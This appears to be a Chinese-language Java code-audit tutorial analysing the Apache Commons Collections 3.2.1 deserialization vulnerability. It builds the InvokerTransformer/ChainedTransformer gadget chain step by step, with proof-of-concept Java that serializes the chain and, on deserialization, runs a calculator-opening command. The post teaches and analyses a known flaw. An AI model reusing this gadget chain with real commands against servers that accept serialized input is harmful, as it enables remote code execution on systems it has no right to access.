> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VDztKTDNaWoNBsUm9IWn2g)

简述
--

`Apache Commons Collections`是`Apache Commons`的组件，它们是从`Java API`派生而来的，并为 Java 语言提供了组件体系结构。`Commons-Collections`试图通过提供新的接口，实现和实用程序来构建 JDK 类。

`Apache Commons`包应该是 Java 中使用最广发的工具包，很多框架都依赖于这组工具包中的一部分，它提供了我们常用的一些编程需要，但是 JDK 没能提供的机能，最大化的减少重复代码的编写。

2015 年 11 月 6 日 FoxGlove Security 安全团队的`@breenmachine`发布了一篇长博客，阐述了利用 Java 反序列化和`Apache Commons Collections`这一基础类库实现远程命令执行的真实案例，各大 Java Web Server 纷纷躺枪，这个漏洞横扫 WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 的最新版。

要了解这一节课的知识需要提前学习我们第一节课的反射知识 [Java 代码审计系列第一课 反射机制](https://mp.weixin.qq.com/s?__biz=MzI4MTQxMjExMw==&mid=2247484808&idx=1&sn=1db4b68db76bf5ffc6e9afd59e8b9843&scene=21#wechat_redirect)

搭建环境
----

`Apache Commons Collections` 官方在漏洞第一时间就已经修补了漏洞，所以有漏洞的版本是 >=3.2.1 的，配置好 maven，就会自动下载下来。

```
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --><dependency>    <groupId>commons-collections</groupId>    <artifactId>commons-collections</artifactId>    <version>3.2.1</version></dependency>
```

打开依赖包，看到 `/org/apache/commons/collections/functors/InvokerTransformer.class`

![](https://mmbiz.qpic.cn/mmbiz_png/uqkCa4umw7grKkYBwuL3zFicevzXviabpnBgMPK80AMh4or91E7ThCgTS6F00S8Aek0GHsWVowgbXVhkaowPwoaA/640?wx_fmt=png)

打开这个文件。

漏洞分析
----

### 漏洞成因

上节课我们说过，java 的反射可以动态的调用类和类里面的方法，用就是类似如下代码

```
Class class1 = Class.forName(req.getParameter("className")); class1.getMethod(req.getParameter("methodName")).invoke(class1.newInstance());
```

而`InvokerTransformer.class` 中的第 54 行的`transform`方法

![](https://mmbiz.qpic.cn/mmbiz_png/uqkCa4umw7grKkYBwuL3zFicevzXviabpnOesG2wxAT7T9HqOlmpt99g7DmMySlA9HicE2esK9MJfa6xRatKCkoLw/640?wx_fmt=png)

可以看到`transform`方法利用 Java 的反射机制进行任意方法调用。`input`参数是传入的一个实例化对象，反射调用的是其方法。就很直接的调用了 Java 中的反射机制去实例化对象！

```
Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);
```

不过值得注意的是，仅仅是这里是不能够命令执行的，因为 Java 不像 PHP 那样是面向过程的编程，不能直接执行类似`system`, `shell_exec` 之类的函数，Java 是一门面向对象的语言，所谓万物皆对象，没有对象 new 一个。执行操作的时候，需要**对象 -> 方法**，

或者**类 -> 静态方法**， 最常用的就是 `java.lang.Runtime.getRuntime().exec(cmd)`，因此，光凭这个反射还是不能造成命令执行漏洞的，需要调用到`transform` 这个方法，并且将调用的结果作为下一次的输入。

### 找调用链

所以，我们得继续翻这个包，看看有没有满足我们条件的方法。直到找到`/org/apache/commons/collections/functors/ChainedTransformer.class` 这个文件

```
public class ChainedTransformer implements Transformer, Serializable {    private static final long serialVersionUID = 3514945074733160196L;    private final Transformer[] iTransformers;   // .... 其他不重要的代码省略    public Object transform(Object object) {        for(int i = 0; i < this.iTransformers.length; ++i) {            object = this.iTransformers[i].transform(object);        }        return object;    }}
```

可以看到这里的`transform` 实现了`Transformer`这个接口，重写了`transform`方法，并在里面遍历所有重写`Transformer`接口的对象，

调用其的`transform`方法然后返回个`object`, 返回的`object`继续进入循环, 成为下一次调用的参数, 那我们怎么通过这里来执行命令呢？

### 构造 Payload

结合`InvokerTransformer`可以构造出：

```
package com.evalshell.main;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.InvokerTransformer;public class HelloController {    public static void main(String[] args) {        Transformer[] transformers = new Transformer[]{                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})};        Transformer transformerChain = new ChainedTransformer(transformers);        transformerChain.transform(Runtime.getRuntime());     }}
```

[视频详情](javascript:;)

这里的`Runtime.getRuntime()` 会带入到`InvokerTransformer` 中的`transform`, 此时里面 cls 就是`Runtime.getRuntime()`, `cls.getMethod(this.iMethodName, this.iParamTypes);` 所以第一个参数就应当为`getMethod`；而`getMethod`方法的签名为`getMethod(String, Class...)`，我们实际用的时候也只传入了一个 String，所以第二个参数应当写为`new Class[] {String.class, Class[].class}`，第三个参数则为调用`getMethod`时候实际传入的参数，所以应当为`new Object[] {"getRuntime", new Class[0]}`就可以了。这个`this.iMethodName` 就是我们传进去的参数`exec`, 后面就是我们穿的 String 类型的数组`"open -a Calculator"`, 这样一条完整的利用链就完成了。  

但是这里实例化后的对象`Runtime`不允许序列化，所以不能直接传入实例化的对象。所以我们需要在`transforms`中利用`InvokerTransformer`反射回调出`Runtime.getRuntime()`。

```
Transformer[] transformers = new Transformer[] {            //传入Runtime类            new ConstantTransformer(Runtime.class),            //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法            new InvokerTransformer("getMethod",                    new Class[] {String.class, Class[].class },                    new Object[] {"getRuntime", new Class[0] }),            //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象            new InvokerTransformer("invoke",                    new Class[] {Object.class, Object[].class },                    new Object[] {null, new Object[0] }),            //反射调用exec方法            new InvokerTransformer("exec",                    new Class[] {String.class },                    new Object[] {"open -a Calculator"})    };Transformer transformerChain = new ChainedTransformer(transformers);
```

整个调用链是`((Runtime) Runtime.class.getMethod("getRuntime").invoke()).exec("open -a Calculator")`现在反序列化后就可以`obj.transform("随意输入");`这样触发命令执行，但是一般也没有这样的代码，我们还需要继续构造。

### 反序列化利用

到目前为止，我们已经构造出了可以执行命令的恶意 chain，姑且称之为基于 Poc 的验证利用链。现在只要找到一个符合以下条件的类，满足以下条件，并且服务端有反序列化的入口，就可以 RCE 了：

1.  该类重写了`readObject`方法；
    
2.  该类在`readObject`方法中操作了我们序列化后实现了`pocChain`的`TransformedMap`；
    

这样的操作, 我们可以在`/org/apache/commons/collections/functors/ConstantTransformer.class`找到

![](https://mmbiz.qpic.cn/mmbiz_png/uqkCa4umw7grKkYBwuL3zFicevzXviabpnbMzTXkIEXF5EwCHEdibicDps1JqVOwqD6k6L9sKVtBVBpx3GH1HBVz1g/640?wx_fmt=png)

因为在`ConstantTransformer`中, 调用 transform 方法时不管输入什么都不会影响返回, 所以, 随意输入即可。

那么能否直接这样构造进行序列化呢, 编写代码试试, 编写一个序列化的 demo

```
package com.evalshell.main;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.io.*;public class HelloController {    public static void main(String[] args) {        Transformer[] transformers = {                new ConstantTransformer(Runtime.class),                new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class}, new Object[]{"getRuntime", new Class[0] }),                new InvokerTransformer("invoke", new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]} ),                new InvokerTransformer("exec",                        new Class[] {String.class },                        new Object[] {"open -a Calculator"})        };        Transformer transformerChain = new PocTransformer(transformers);             //序列化对象        try{            File f  = new File("f_u_c_k_object");            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(f));            outputStream.writeObject(transformerChain);            outputStream.flush();            outputStream.close();        }catch (IOException exception){            exception.printStackTrace();        }    //反序列化对象        try {            File f = new File("f_u_c_k_object");            ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(f));            Transformer f_u_c_k_object = (Transformer) objectInputStream.readObject();            f_u_c_k_object.transform("fenguxan"); //这里可以填写任意值            System.out.println(f_u_c_k_object.getClass());        }catch (FileNotFoundException exception){            exception.printStackTrace();        }catch (ClassNotFoundException exception){            exception.printStackTrace();        }catch (IOException exception){            exception.printStackTrace();        }    }}class PocTransformer implements Transformer, Serializable{    private final Transformer[] iTransformers;    PocTransformer(Transformer[] iTransformers) {        this.iTransformers = iTransformers;    }    @Override    public Object transform(Object object) {        for(int i = 0; i < this.iTransformers.length; ++i) {            System.out.println(object.getClass());            object = this.iTransformers[i].transform(object);        }        return object;    }}
```

![](https://mmbiz.qpic.cn/mmbiz_png/uqkCa4umw7grKkYBwuL3zFicevzXviabpnJpnA7ZLPv67icUl5pBZjFlgUKWxPwBEu3BXic8yhBHF7n7HyafiaOk5ibw/640?wx_fmt=png)

后续的攻击链就不是我们本节课的重点了，大家可以自己去看下参考链接

参考
--

https://xz.aliyun.com/t/4558#toc-0 https://www.anquanke.com/post/id/82934 https://p0sec.net/index.php/archives/121/ https://security.tencent.com/index.php/blog/msg/97